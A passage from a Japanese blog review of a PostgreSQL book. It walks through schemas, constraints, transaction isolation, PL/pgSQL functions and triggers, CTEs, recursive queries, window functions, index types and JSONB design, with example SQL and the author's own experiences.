に慣れていると、0 から始めたくなるんですよね。私の直感を裏切るポイントでした。ちょっと昔だとこちらの資料とかはめちゃくちゃ良いのでオススメです。 speakerdeck.com speakerdeck.com基本クエリ1.6 節では、基本的な SQL クエリが紹介されています。SELECT symbol, count(*) AS total_volumeFROM tradesGROUP BY symbolORDER BY total_volume DESC;著者は count(*) が「Postgres で特別に最適化されている」と書いています。この本を通して、Postgres の内部動作についての理解が深まりました。DBといえばそーだいさんの資料を読み漁ってほしいです。 speakerdeck.com2. Standard RDBMS capabilitiesデータベースの三層構造を理解していなかったこの章で再認識したのは、Database → Schema → Table という三層構造の実践的な使い方です。10 年近く Postgres を運用してきた中で、Schema は使ってきました。ただ、この章で説明されているような「マイクロサービスのモジュールごとにスキーマを分ける」という設計パターンは、改めて整理されると納得感があります。この章で説明されている eコマースプラットフォームの設計が、その例です。coffee_chain (database)├── products (schema)│   ├── catalog (table)│   └── reviews (table)├── customers (schema)│   └── accounts (table)└── sales (schema)    ├── orders (table)    └── order_items (table)マイクロサービスのモジュールごとにスキーマを分ける。この設計パターン自体は知っていましたが、この本の整理の仕方は参考になります。著者は明確に書いています。Each application module or microservice has its own schema containing all the related data.これなら、アプリケーション層のアーキテクチャとデータベース層の構造が一致します。名前の衝突も避けられます。でも、同じデータベース内だから、JOIN で複数スキーマのテーブルをまたいでクエリできます。マルチテナント構成において Database レベルで分離していることも納得がいきました。テナントごとにデータベースを分け、リソースを共有しながら完全に隔離します。スケールアウト時には特定のテナントだけ別サーバーへ移動可能です。この設計思想、次のプロジェクトで導入を検討しようと思います。制約はデータベースでやるべきか2.3 節のデータ整合性の話で、著者のスタンスが面白かったです。著者のチームは、最初はアプリ層ですべてを検証する想定でした。でも、実際にプロダクトを構築していく中で、アプリ層のチェックが破られてデータ整合性の問題が発生しました。その経験から、著者はこう述べています。we decide to add additional constraints at the database level.私の経験でも、制約をデータベースに入れるべきか、アプリ層でやるべきかという論争が何度もありました。著者は両方を推奨しています。アプリ層でチェックしつつ、データベース層にも防御線を張ります。この章では、バグでアプリ層のチェックが破られたとき、外部キー制約がデータの不整合を防いだ例が出てきます。ERROR: insert or update on table \\"reviews\\" violatesforeign key constraint \\"products_review_product_id_fk\\"DETAIL: Key (product_id)=(1004) is not present in table \\"catalog\\".アプリのバグで product_id が 4 じゃなくて 1004 になっていました。でも、外部キー制約があったから、データベースにゴミが入らずに済みました。多層防御。これがデータ整合性の正しいアプローチだと感じました。アプリ層だけに頼ると、コードが変わったときに破綻します。データベース層だけに頼ると、エラーハンドリングが遅れて UX が悪化します。両方でやるべきです。トランザクション分離レベルの実践理解2.4 節のトランザクションで、MVCC と read committed 分離レベルの説明が具体的で良かったです。理論は知っていました。でも、この章の Table 2.1 の 2 つの psql セッションを並行実行する例を見て、実際の動きがイメージできるようになりました。2 つのトランザクションが同じ商品 (id=1) の在庫数を同時に減らそうとします。トランザクション 1 が UPDATE を実行（まだコミットしてない）トランザクション 2 が SELECT を実行 → まだ 199 が見える（dirty read を防いでいる）トランザクション 2 が UPDATE を実行 → ブロックされるトランザクション 1 が COMMIT → トランザクション 2 がアンブロックされるトランザクション 2 の UPDATE が最新の値（198）を読み直して実行される最後のポイントが重要でした。ブロックが解除された後、トランザクション 2 は再度値を読み直します。だから、結果は 197 になります（199 → 198 → 197）。もしこれがなかったら、トランザクション 2 は古い値（199）から 1 を引いて 198 にしてしまい、トランザクション 1 の更新が消えます（lost update）。Postgres の read committed は dirty write も防ぎます。だから、本番環境でデフォルトの分離レベルとして十分に使えます。もちろん、phantom read や non-repeatable read を防ぎたいケースもあります。そのときは repeatable read や serializable を使います。でも、大半のユースケースでは read committed で問題ありません。この理解、実際に手を動かさないと身につきませんでした。データベース関数で何をやるべきか2.6 節の関数とトリガーは、この章で一番刺激的でした。著者は order_add_item と order_checkout という 2 つの PL/pgSQL 関数を実装しています。ショッピングカートの管理ロジックをデータベース関数として実装した例です。最初は「これ、アプリ層でやればいいんじゃない？」と思いました。モダンなマイクロサービスアーキテクチャを信奉する我々にとって、データベース関数は「おじいちゃんの時代の遺物」みたいなイメージがありました。でも、著者の説明を読んで納得しました。書籍には「At least two scenarios come to mind」として 2 つのシナリオが紹介されています。複雑なビジネスロジックがデータと密結合している場合 → すべてのクライアントアプリやマイクロサービスで同じロジックを実装するより、データベース関数 1 つで済む複数ステップの処理でアプリとデータベース間の往復が必要な場合 → 大量のデータ転送が必要なとき、データベース内で完結させたほうが効率的order_add_item 関数の実装を見ると、この 2 つの利点がよくわかります。CREATE OR REPLACE FUNCTION sales.order_add_item(customer_id_param INT,  product_id_param INT, quantity_param INT)RETURNS TABLE (...) AS $$DECLARE    pending_order_id UUID;BEGIN    -- 1. 既存の pending order を探す    SELECT id INTO pending_order_id FROM sales.orders    WHERE customer_id = customer_id_param AND status = \'pending\';    -- 2. なければ作る    IF pending_order_id IS NULL THEN        INSERT INTO sales.orders (customer_id, status)        VALUES (customer_id_param, \'pending\')        RETURNING id INTO pending_order_id;    END IF;    -- 3. 商品を追加または更新（MERGE 文）    MERGE INTO sales.order_items AS oi ...    -- 4. 結果を返す    RETURN QUERY SELECT ...;END;$$ LANGUAGE plpgsql;これをアプリ層でやろうとすると、複数のクエリを順次実行する必要があります。SELECT で pending order があるか確認なければ INSERT で作成SELECT で商品の価格を取得INSERT or UPDATE で order_items に追加SELECT で最終的なカート内容を取得アプリとデータベース間で何度もデータをやり取りする必要があり、ネットワークレイテンシの影響を受けます。データベース関数なら 1 回の呼び出しで完結します。しかも、トランザクショナルに実行されます。途中でエラーが起きたら全部ロールバックされます。でも、すべてをデータベース関数でやるべきではありません。著者も「少なくとも 2 つのシナリオ」と言っています。つまり、適切なユースケースを見極めることが重要です。私の基準はこうです。やるべき: データと密結合した複雑なロジック、複数ラウンドトリップが必要なケースやらないべき: ビジネスロジックの大半、頻繁に変更されるロジック、外部 API との連携この判断基準、次のプロジェクトで使いたいです。ちなみに、PL/pgSQL を書いていて何度かハマったポイントがあります。SELECT ... INTO で結果が 0 行の場合、変数は NULL になります。エラーにはなりません。これを知らずに「なぜ NULL が入る？」と 30 分悩んだことがあります。あと、ON CONFLICT DO UPDATE で新しい値を参照するには EXCLUDED を使います。EXCLUDED.quantity のように書きます。最初は「新しい値をどう参照するんだ？」と混乱しました。一番タチが悪いのは、変数名とカラム名の衝突です。SELECT * FROM orders WHERE order_id = order_id と書くと、両方が変数として解釈されて全行が返ってきます。デバッグが本当に難しい。だから p_customer_id や v_order_id のようにプレフィックスを付けるのがベストプラクティスです。トリガーは「見えない魔法」になりやすい2.6.2 節のトリガーの例も実践的でした。order_items テーブルに変更があったら自動的に orders.total_amount を更新します。CREATE TRIGGER trigger_update_order_totalAFTER INSERT OR UPDATE OR DELETE ON sales.order_itemsFOR EACH ROWEXECUTE FUNCTION sales.update_order_total();これはシンプルで便利ですが、トリガーは「見えない魔法」になりやすいと感じました。アプリ層のエンジニアが INSERT INTO sales.order_items を実行したとき、裏で sales.orders が更新されていることに気づかないかもしれません。トリガーが増えると、データベースのパフォーマンス問題の原因を追うのが難しくなります。「なぜこの INSERT が遅い？」と思ったら、実は裏で 3 つのトリガーが動いていた、みたいな。著者はトリガーの適切なユースケースを挙げています。Triggers are particularly useful in audit scenarios, where you need to track who made changes in the database, or in event-driven architectures.監査ログ（誰がいつ変更したか）イベント駆動アーキテクチャ（変更を他のシステムに通知）トリガーを書いていて一度ハマったのは、NEW と OLD の使い分けです。NEW は INSERT/UPDATE で使用可能で、OLD は UPDATE/DELETE で使用可能。DELETE トリガーで NEW.order_id にアクセスしようとしてエラーになりました。COALESCE(NEW.order_id, OLD.order_id) のような対応が必要だと、その時初めて知りました。あと、大量の行を更新する場合、行ごとにトリガーが発火してパフォーマンスが低下します。FOR EACH ROW のトリガーは便利ですが、一括更新のパフォーマンスには注意が必要です。これ以外のケースでは、慎重に検討すべきだと思います。View は「名前付きクエリ」2.7 節の View の説明はシンプルで明快でした。A view is essentially a named query that returns data in a tabular format.View = 名前付きクエリ。この理解が正しいです。複雑な JOIN と集計を含むクエリを、アプリ層の複数箇所で使い回すより、View として定義してしまいます。CREATE VIEW sales.product_sales_summary ASSELECT    c.name AS product_name,    c.category,    SUM(oi.quantity) AS total_quantity_sold,    SUM(oi.quantity * oi.price) AS total_revenueFROM products.catalog cLEFT JOIN sales.order_items oi ON c.id = oi.product_idGROUP BY c.idORDER BY total_quantity_sold DESC, total_revenue DESC;アプリ層からはこうです。SELECT * FROM sales.product_sales_summary WHERE category=\'coffee\';これだけで済みます。Materialized View も便利ですが、リフレッシュのタイミングが悩ましいです。手動リフレッシュ：ユーザーが「更新」ボタンを押したとき定期リフレッシュ：pg_cron で 1 時間ごとイベント駆動：トリガーで特定のテーブルが更新されたとき著者は 3 つのアプローチを提案していますが、ユースケースによって使い分けるべきです。3. Modern SQLSQL-92 の呪縛から解き放たれるこの章を読んで改めて認識したのは、自分がまだ SQL-92 の世界に閉じこもっていたという事実です。pgsql-jp.github.io著者の Markus Winand の言葉を引用します。Since 1999, SQL is not limited to the relational model anymore. Back then, ISO/IEC 9075 (the \\"SQL standard\\") added arrays, objects, and recursive queries. In the meantime, the SQL standard has grown five times bigger than SQL-92. In other words: relational SQL is only about 20% of modern SQL.SQL-92 は全体の 20% でしかありません。残りの 80% が Modern SQL です。でも、正直に言うと、私は長年その 20% の世界で生きていました。CTE は知っていたけど、「読みやすさのための構文糖衣」程度にしか思っていませんでした。Window Functions も「集計が少し楽になるやつ」くらいの認識。Recursive Queries に至っては、「使う機会がない」と決めつけていました。この章を読み終えて、自分がどれだけ Postgres の可能性を狭めていたかを再認識しました。なぜ Modern SQL を使わないのか著者は、Modern SQL が普及しない理由を 2 つ挙げています。理由1: 獲得した知識の粘着性（Stickiness of gained knowledge）Some developers learned SQL many years ago and mastered the SQL-92 version of the language for various data processing tasks. Even if their SQL queries are verbose or less efficient, the tasks are still solvable. As a result, many people continue doing things the way they originally learned.痛いほど身に覚えがあります。私が SQL を覚えたのは 15 年以上前です。当時の教科書は SQL-92 ベースで、GROUP BY、JOIN、Subquery があれば何でも解決できました。その成功体験が、今も私の手を縛っています。まるで、「ガラケーで十分じゃん」と言い張っていた 2010 年の自分を見ているようです。「CTE を使えば読みやすくなる」と頭ではわかっていても、「でも、Subquery でも書けるしな」と思ってしまいます。結果、冗長で読みにくいクエリを量産します。後輩に「このネストの深さ、どこまで行くんですか…？」と言われたことは秘密です。理由2: ORM フレームワークSome developers fully rely on ORM frameworks as a layer between their application and the database. They trust the ORM framework to generate SQL queries, believing it knows the best way to query or manipulate data.これも痛い指摘です。やめてくれおれにきく。ORM は確かに便利です。でも、ORM が生成するクエリは「汎用的なワークロード」を想定しています。Window Functions を使えば 1 回のクエリで済むケースでも、ORM は複雑な Self-Join を生成するかもしれません。第 1 章で学んだ「Just use Postgres」の思想は、ORM へ任せる前に、Postgres で何ができるかを知ることにも通じます。CTE（Common Table Expressions）は単なる Subquery の糖衣構文ではないCTE は「読みやすい Subquery」という側面で使うことが多かったです。でも、この章を読んで、それ以上の価値があることを再確認しました。Listing 3.3 の例では、2 つの CTE を使って「3 人以上のユーザーが聴いて、半分以下の時間しか再生しなかった曲」をランキングしています。WITH plays_cte AS (    SELECT s.title, s.duration, p.play_duration, p.user_id    FROM streaming.plays p    JOIN streaming.songs s ON p.song_id = s.id    WHERE p.play_start_time::DATE BETWEEN \'2024-09-15\' AND \'2024-09-16\'      AND p.play_duration < (s.duration / 2)),user_play_counts AS (    SELECT title, duration, COUNT(DISTINCT user_id) AS user_count,      MIN(play_duration) AS min_play_duration,      COUNT(*) AS total_play_count    FROM plays_cte    GROUP BY title, duration)SELECT title, duration, min_play_duration, total_play_countFROM user_play_countsWHERE user_count >= 3ORDER BY min_play_duration ASCLIMIT 3;このクエリを Subquery で書いたら、どうなるでしょうか。ネストが深くなって、読みにくくなります。メンテナンスもしにくくなります。でも、著者が強調しているのは「読みやすさ」だけではありません。If we want to understand how a query is actually executed by Postgres, we can look at the query execution plan using the EXPLAIN statement.EXPLAIN の結果を見ると、Postgres は plays_cte を user_play_counts に fold しています。つまり、CTE を使っても、実行計画は効率的なままです。これは重要なポイントです。以前のバージョンでは CTE が「最適化の壁」になることがありましたが、現在は改善されています。実際に EXPLAIN ANALYZE で確認してみました。Postgres は CTE をインライン展開して最適化しています。以前は CTE が「最適化の壁」と呼ばれていましたが、現在のバージョンでは改善されています。CTE が展開されて効率的なプランになっていることが確認できました。Postgres は賢いです。Data-modifying CTE という選択肢Listing 3.4 で紹介されている Data-modifying CTE は、私にとって完全に新しい概念でした。WITH updated_play AS (    UPDATE streaming.plays    SET play_duration = 200    WHERE id = 30    RETURNING song_id, play_duration)SELECT s.title, s.duration,       CASE           WHEN up.play_duration = s.duration THEN \'Moved Up the Rank\'           ELSE \'Rank Not Changed\'       END AS rank_change_statusFROM updated_play upJOIN streaming.songs s ON s.id = up.song_id;UPDATE の結果を RETURNING で受け取り、その結果を使って SELECT を実行します。これが 1 つのトランザクション内で完結します。これまで、「UPDATE してから SELECT」という処理は、2 つのクエリを順番に実行していました。でも、Data-modifying CTE を使えば、1 つのクエリで完結します。アトミック性も保証されます。なぜこの機能を今まで積極的に使ってこなかったのでしょうか。使う場面を意識していなかったというのが正直なところです。Recursive Queries は「特殊なケースでしか使わない」という誤解Recursive Queries は「組織の階層構造を扱う時に使う機能」という認識でした。実際、それ以外の場面で使う機会は多くありませんでした。でも、この章を読んで、活用範囲が広いことを再確認しました。著者が例として挙げているのは、音楽ストリーミングサービスの「連続再生」のトラッキングです。plays テーブルには played_after というカラムがあり、「この曲の前に再生された曲の ID」を保持しています。つまり、連続再生はリンクリストの構造を持っています。Listing 3.8 の Recursive Query は、この連続再生のシーケンスを取得します。WITH RECURSIVE play_sequence AS (    SELECT id, user_id, song_id,      play_start_time, play_duration, played_after    FROM streaming.plays    WHERE id = 5    UNION ALL    SELECT p.id, p.user_id, p.song_id, p.play_start_time,       p.play_duration, p.played_after    FROM streaming.plays p    JOIN play_sequence ps ON p.played_after = ps.id)SELECT user_id, song_id, play_start_time,  play_duration as duration, played_afterFROM play_sequenceORDER BY play_start_time;これを読んで、以前アプリ側で何度もループしてクエリを投げていた処理を思い出しました。以前のプロジェクトで、SNS のスレッド返信を表示する機能を実装した時、「親コメント ID」を辿って、アプリ側で再帰的にクエリを投げていました。その結果、N+1 問題が発生して、パフォーマンスが悪化しました。当時のアプリログを見返すと、同じユーザーの操作で DB への接続数が 47 回。まるでチャットボットが会話のキャッチボールをしているかのようでした。もちろん、レスポンスタイムは 3 秒超え。あの時、Recursive Query を知っていたら、1 回のクエリで全ての返信を取得できました。Recursive Query の実行フローListing 3.7 の擬似コードは、Recursive Query の実行フローを明確に説明しています。# Step 1: 非再帰項を実行（初期データ）non_recursive_result = execute(non_recursive_term);# Step 2: 重複削除（UNION の場合）if (using UNION)    non_recursive_result = remove_duplicates(non_recursive_result);# Step 3: 最終結果に追加final_result.add(non_recursive_result);# Step 4: ワーキングテーブルを初期化working_table = non_recursive_result;# Step 5: 再帰項を実行（ワーキングテーブルが空になるまで）while (working_table is not empty) {    intermediate_table = execute(recursive_term, using=working_table);    if (using UNION)        intermediate_table =            remove_duplicates(intermediate_table, excluding=final_result);    final_result.add(intermediate_table);    working_table = intermediate_table;}このフローを読んで、「Recursive Query は魔法じゃなくて、ちゃんとした仕組みがある」と納得できました。特に重要なのは、UNION と UNION ALL の違いです。UNION は重複削除するので、無限ループを防げます。UNION ALL は重複を許すので、パフォーマンスは良いですが、無限ループのリスクがあります。ところで、Recursive CTE を書いていて気になったのは終了条件です。調べてみると、終了条件は「新しい行が生成されなくなるまで」で、明示的に書く必要はありません。循環検出には配列で訪問済みノードを追跡する方法が有効です。ARRAY[id] AS path で初期化して、ps.path || p.id で追加していく。NOT p.id = ANY(ps.path) で循環を検出できます。このパターンは覚えておくと便利です。ただし、深い階層（数千レベル）ではパフォーマンスが低下します。グラフ DB ほど柔軟なグラフ探索はできません。SNS の友達の友達を無限に辿るような処理には向いていないです。この違いを理解していないと、本番環境で無限ループが発生します。怖いです。データベース監視の Slack チャンネルが「CPU 使用率 100%」「接続数の上限到達」で埋め尽くされる光景は、二度と見たくありません。Window Functions は Self-Join の代替ではないWindow Functions は「Self-Join の代わりに使える構文」という認識で使ってきました。でも、この章を読んで、パフォーマンス面での違いを改めて確認しました。Listing 3.11 の Self-Join と Listing 3.12 の Window Function を比較すると、違いが明確です。Self-Join 版:SELECT DISTINCT p.song_id,       p.user_id,       t.total_durationFROM streaming.plays pJOIN (    SELECT song_id,           SUM(play_duration) AS total_duration    FROM streaming.plays    GROUP BY song_id) t ON p.song_id = t.song_idORDER BY p.song_id;Window Function 版:WITH plays_with_total AS (  SELECT    song_id, user_id, SUM(play_duration)    OVER (PARTITION BY song_id) AS total_duration  FROM streaming.plays)SELECT DISTINCT song_id, user_id, total_durationFROM plays_with_totalORDER BY song_id, user_id;Self-Join 版は、テーブルを 2 回走査しています。Window Function 版は、1 回の走査で済みます。著者の言葉を借りれば、次のようになります。Although the self-join approach works as expected, it\'s not the most efficient, because every row of the table is accessed twice. Additionally, it\'s not the easiest to follow when trying to understand the query logic.これを読んで、「Window Functions は単なる糖衣構文じゃなくて、パフォーマンス最適化の手段だった」と気づきました。Running Total と Window FrameListing 3.13 の Running Total の計算は、Window Functions の本質を理解する上で重要でした。SELECT song_id, user_id, play_duration, SUM(play_duration)OVER (PARTITION BY song_id ORDER BY user_id) AS total_play_durationFROM streaming.playsWHERE song_id = 2;結果は次のようになります。 song_id | user_id | play_duration | total_play_duration---------+---------+---------------+---------------------       2 |       1 |           144 |                 144       2 |       2 |           206 |                 350       2 |       3 |           186 |                 654       2 |       3 |           118 |                 654PARTITION BY song_id で Window を作り、ORDER BY user_id で Window を Frame に分割します。各 Frame は、現在の行 + それ以前の行を含みます。この仕組みを理解すると、「累積和」「移動平均」「ランキング」といった処理が、すべて Window Functions で解決できることがわかります。以前のプロジェクトで、時系列データの累積和を計算する時、アプリ側でループを回していました。あれも、Window Functions を使えば 1 回のクエリで済みました。RANK() と ROW_NUMBER() の違いListing 3.14 の RANK() は、同じ値に同じランクを付けます。SELECT song_id, SUM(play_duration) AS total_play_duration,RANK() OVER (ORDER BY SUM(play_duration) DESC) AS song_rankFROM streaming.playsGROUP BY song_idORDER BY song_rank;もし ROW_NUMBER() を使っていたら、同じ値でも異なる番号が振られます。この違いを理解していないと、ランキング機能で不具合が発生します。実際に試してみると、3 つの関数の違いがはっきりします。ROW_NUMBER(): 同じ値でも異なる番号（1→2→3→4→5）RANK(): 同じ値は同じ番号で次は飛ぶ（1→2→2→4→5）DENSE_RANK(): 同じ値は同じ番号で次は飛ばない（1→2→2→3→4）以前、ランキング機能で ROW_NUMBER() を使って、同点の処理がおかしくなったことがあります。「なぜ同じスコアなのに順位が違うの？」というバグ報告を受けて、RANK() に変更しました。この違いは一度経験すると忘れません。4. Indexesインデックスの「当たり前」を疑う第 4 章「Indexes」の冒頭の一文が、自分の習慣を言い当てていました。Indexes are often the first optimization technique that comes to mind when dealing with a long-running query or a slow database operation.そうなんです。遅いクエリがあったら、とりあえずインデックス張る。それが 10 年間の私のパターンでした。まるで風邪を引いたら「とりあえずビタミン C」みたいな、根拠のない安心感でした。でも、著者は続けます。They\'ve proven so effective in many scenarios that we sometimes overlook other optimization methods, turning to indexes right away.インデックスに頼りすぎて、他の最適化手法を見落としている。この指摘は痛かったです。実際、過去のプロジェクトで「遅いクエリ問題」が発生した時、私はいつもまずインデックスを疑っていました。でも、本当は EXPLAIN で実行計画を見て、ボトルネックを特定してから判断すべきでした。この章では、インデックスの「なぜ」と「いつ」を徹底的に掘り下げています。単なるインデックス作成のチュートリアルじゃありません。インデックス戦略の哲学です。なぜインデックスがこんなに人気なのか4.1 節「Why are indexes so popular?」では、O(N)と O(log_b N)の違いが説明されています。100 件のテーブルで ID=5 を探す場合。インデックスなし：最大 100 回のルックアップ（O(N)）B-tree インデックスあり：最大 4 回のルックアップ（O(log_b N)、b=3 の場合）これが 100 万件に増えても、インデックスがあれば 6 回のルックアップで済みます（b=10 の場合）。正直、この計算量の違いは知っていました。でも、著者が示した表を見て改めて驚きました。 テーブルサイズ  インデックスルックアップ回数  100件          2回                         1,000件        3回                         1,000,000件    6回                         10,000,000件   7回                         1,000,000,000件  9回                      10億件のテーブルでも9回のルックアップ。これがインデックスの威力です。深夜の障害対応で「インデックス張れば解決するっしょ」と言い続けてきた自分が、ようやく理論武装できた瞬間でした。そして、著者の言葉が刺さります。As a result, it\'s no surprise that indexes are such a popular optimization technique.インデックスが人気な理由は、この圧倒的な効率性にあります。でも、だからこそ安易に使いすぎるリスクもあります。EXPLAIN — まず実行計画を見ろ4.4 節で EXPLAIN が詳しく説明されています。私はこれまで、EXPLAIN ANALYZE しか使っていませんでした。でも、この章を読んで EXPLAIN (analyze, costs off) や EXPLAIN (analyze, buffers on) といった他のオプションを知りました。特に印象的だったのは、buffers オプションです。Buffers: shared hit=3これは「3 ページをメモリから読んだ（ディスクアクセスなし）」という意味です。もし read=4 があれば、「4 ページをディスクから読んだ」ということになります。遅いクエリの原因はインデックスの欠如じゃなく、メモリ不足かもしれません。この視点は新鮮でした。私は「遅い = インデックスがない」と決めつけていました。でも、buffers を見れば、ディスク I/O が原因なのか実行計画が原因なのか区別できます。著者は次のように書いています。This information is crucial because a query might run slowly not due to a suboptimal execution plan or missing index but because memory has become a limited resource.インデックスは万能じゃありません。頭ではわかっていても、実務では軽視しがちでした。単一カラムインデックス — B-tree vs Hash4.5 節では、単一カラムインデックスが 2 種類紹介されています。B-tree：範囲検索（>, <, BETWEEN）に対応Hash：等価検索（=, IN）のみ私は今まで、Hash インデックスを積極的に選択してきませんでした。「B-tree がデフォルトだから」という理由で、あえて変える必要性を感じていなかったためです。でも、この章を読んで考えが変わりました。例えば、ゲーム内のチャンピオンタイトル（5 種類のみ）を検索する場合。範囲検索は不要で、等価検索だけで十分です。この場合、Hash インデックスが最適です。CREATE INDEX idx_champion_titleON game.player_statsUSING hash(champion_title);実行計画を見ると、Hash インデックスを使った場合の実行時間は 0.073 ms。フルテーブルスキャンの 1.463 ms と比べて 20 倍速いです。ユースケースに合わせてインデックスタイプを選ぶ。これが正しいアプローチです。複合インデックス — 順番が命4.6 節「Composite indexes」は、この章で最も重要なセクションだと思います。複合インデックスの順番は、クエリのパフォーマンスに直結します。例えば、(region, score DESC, win_count DESC) というインデックスを作った場合。CREATE INDEX idx_region_score_win_countON game.player_stats (region, score DESC, win_count DESC);このインデックスは、次のクエリで使われます。-- ✅ 使われるWHERE region = \'NA\' and score > 5000 and win_count > 10-- ✅ 使われるWHERE region = \'EMEA\' and score > 1000-- ✅ 使われる（先頭カラムがあるから）WHERE region = \'EMEA\'-- ❌ 使われない（先頭カラムがない）WHERE score > 1000 and win_count > 30先頭カラム（leading column）が必須。これがないと、複合インデックスは使われません。この章を読みながら実際に手を動かしてみました。EXPLAIN ANALYZE の出力で Index Scan と Index Only Scan の違いを確認することが重要です。Index Only Scan はテーブルにアクセスしないので高速。Covering Index の威力を実感しました。Partial Index については、WHERE 句が完全に一致する場合のみ使用されるという点に注意が必要です。WHERE play_time <= \'50 hours\' で作ったインデックスは、WHERE play_time <= \'50 hours 1 second\' では使われません。1 秒違うだけで使われない。厳密すぎる気もしますが、そういう仕様です。Hash インデックスは範囲検索（<, >, BETWEEN）には使えません。等価検索専用です。これを知らずに「なぜインデックスが使われないんだ？」と悩んだことがあります。インデックスサイズを比較した結果も興味深かったです。idx_champion_hash   - 696 kBidx_covering        - 416 kBidx_region_score    - 248 kBidx_perf_margin     - 120 kBidx_casual_players  - 48 kB   -- Partial Index は最小Partial Index のサイズの小ささは印象的でした。必要な部分だけをインデックス化するという発想、もっと早く知りたかったです。ただし、著者は注記しています。However, starting with Postgres 18, the database introduced support for skip scan lookups on composite B-tree indexes, allowing us to skip leading columns and still use the index in more scenarios.Postgres 18 以降では、skip scan が導入されるらしいです。これは大きな改善です。でも、現時点（Postgres 17 以前）では、複合インデックスの順番を慎重に設計する必要があります。Covering Index — テーブルアクセスをゼロに4.7 節「Covering indexes」は、インデックス最適化の最終形態だと感じました。通常、インデックスは「どの行を読むか」を決めるだけで、実際のデータ（username など）はテーブルから取得します。でも、Covering Index を使えば、インデックスだけで全てのデータを取得できます。CREATE INDEX idx_composite_covering_indexON game.player_stats (region, score DESC, win_count DESC)INCLUDE (username);INCLUDE 句で username をインデックスに含めることで、テーブルアクセスが不要になります。実行計画を見ると。Index Only Scan using idx_composite_covering_index on player_statsHeap Fetches: 0Execution Time: 0.602 msHeap Fetches: 0 — テーブルに一切アクセスしていません。実行時間は 0.602 ms。以前の 1.856 ms（Bitmap Index Scan）から 3 倍速くなりました。ただし、トレードオフがあります。username を更新するたびに、インデックスも更新する必要があります。However, as a tradeoff, all included columns must remain consistent with the table data.更新頻度が低いカラムなら Covering Index は有効。逆に、頻繁に更新されるカラムには向きません。Partial Index — 必要な部分だけインデックス化4.8 節「Partial indexes」では、インデックスのサイズを減らす手法が紹介されています。例えば、10,000 人のプレイヤーのうち、74 人（0.74%）だけが「occasional players（プレイ時間 50 時間以下）」だとします。この 74 人だけを頻繁に検索するなら、全体にインデックスを張る必要はありません。CREATE INDEX idx_occasional_playersON game.player_stats (play_time)WHERE play_time <= \'50 hours\';この Partial Index により。インデックスサイズが大幅に削減される更新時のインデックスメンテナンスコストが減る検索速度は 2 ms から 0.168 ms に改善（20 倍速）ただし、条件が少しでも違うとインデックスが使われません。-- ✅ 使われるWHERE play_time <= \'50 hours\'-- ❌ 使われない（1秒超過）WHERE play_time <= \'50 hours 1 second\'Partial Index は条件が厳密。これを理解して使う必要があります。Expression Index — 計算結果にインデックス4.9 節「Functional and expression indexes」は、私にとって全く新しい概念でした。例えば、「勝数 - 負数」というパフォーマンスマージンで検索したい場合。WHERE (win_count - loss_count) BETWEEN 300 and 450通常、この式はクエリ実行時に毎回計算されます。でも、Expression Index を使えば、計算結果をインデックス化できます。CREATE INDEX idx_perf_marginON game.player_stats ((win_count - loss_count));実行時間は 2.524 ms から 1.200 ms に改善（2 倍速）。ただし、式が複雑になると、インデックスのメンテナンスコストが増えます。win_count または loss_count が更新されるたびに、インデックスも更新されます。頻繁に検索される式にのみ使うのが正しい戦略です。Over-Indexing という警告この章の最後に、著者は重要な警告を発しています。Throughout this chapter, we\'ve explored and added various indexes to the game.player_stats table, bringing the total number of indexes for the table to seven.7 つのインデックス。これは典型的な Over-Indexing だと著者は指摘します。Although this is acceptable for learning purposes, in practice, it represents a classic case of over-indexing.インデックスは無料じゃありません。作成時にディスク容量を消費する更新時にメンテナンスコストがかかる計画時（Planning Time）にオプション評価のコストがかかる私は過去、インデックスを「作りすぎる」傾向がありました。「とりあえずこのカラムにもインデックス張っとくか」という感じで。まるで保険に入りまくる不安な中年のように、あらゆるカラムに「念のため」インデックスを追加していました。そして毎回、INSERT が遅くなってから後悔する、という黄金パターンです。でも、この章を読んで、インデックスは慎重に設計すべきだと改めて理解しました。著者は Appendix A で Over-Indexing と Under-Indexing について詳しく説明しています。実際に読んでみて、自分の過去の設計を振り返る良い機会になりました。この辺の基礎がちゃんとできているか定期的に確認することは大切にしていますが、この Appendix がめちゃくちゃ面白いのでおすすめです。mickindex.sakura.ne.jp5. Postgres and JSONJSON 機能を使うべき場所と使わない場所5.3 節の「JSON in Postgres: Striking the balance」が、この章の核心です。著者が書いているのは、「JSON をすべてのデータに使うな」という明確な警告です。Even though Postgres provides full-fledged support for JSON, you should avoid storing all application data in JSON-specific data types as you would in a pure document database.これが「Just use Postgres」の真髄だと感じました。MongoDB を追加する代わりに Postgres の JSON 機能を使う。でも、すべてのデータを JSON で保存する MongoDB みたいな使い方はするな。ハイブリッドアプローチを取れ、と。pizzeria.order_items テーブルの構造が、この考え方を体現しています。CREATE TABLE pizzeria.order_items (    order_id INT NOT NULL,    order_item_id INT NOT NULL,    pizza JSONB NOT NULL,  -- ここは JSON    price NUMERIC(5,2) NOT NULL,  -- ここは通常の型    PRIMARY KEY (order_id, order_item_id));order_id と price は通常の型で、検索とデータ整合性を重視。pizza の詳細（トッピング、クラスト、ソースなど）は JSONB で、柔軟性を重視。この設計、10 年前のプロジェクトで欲しかったです。JSON を使うべき場面著者が挙げている 3 つの基準が具体的でわかりやすいです。データが静的または更新頻度が低い（設定、メタデータ、顧客プリファレンス）データが疎（スパース）（多くの null や 0、feature flags など）スキーマの柔軟性が必要（外部 API のレスポンス、テレメトリイベント）ピザ注文の詳細は「静的」に該当します。注文確定後はほぼ変更されません。もし従来の正規化モデルで実装すると、5 つのテーブル（pizzas、order_items、pizza_cheeses、pizza_veggies、pizza_meats）が必要になります。著者が示した例を見て、「ああ、これは辛い」と思いました。Write overhead: 1 つのピザ注文のために複数テーブルへの INSERT が必要。7 つのトッピングなら 7 レコード。Read overhead: ピザのレシピを再構築するために複数テーブルの JOIN が必要。Transformation overhead: フロントエンドが JSON で受け取るのに、わざわざ正規化モデルへ分解し、また JSON に戻す。この 3 つの overhead、すべて経験があります。特に Transformation overhead が一番つらいです。API レスポンスを JSON で返すためだけに、複雑な JOIN と整形ロジックを書く。「JSON から分解して正規化して、また JOIN して JSON に戻す」という、まるで水を凍らせてから溶かすような無駄な作業。当時の自分に「Postgres の JSONB を使えばいいぞ」と教えてあげたいです。著者が「hybrid approach」を推奨する理由がよくわかりました。json vs jsonb5.1 節で json と jsonb の違いが説明されています。 型  保存形式  Write 性能  Read 性能  インデックス  推奨度  json  テキスト  速い  遅い（毎回パース）  限定的  ❌  jsonb  バイナリ  遅い（パースあり）  速い  GIN など充実  ✅ 著者の推奨は明確です：jsonb をデフォルトで使え。Overall, 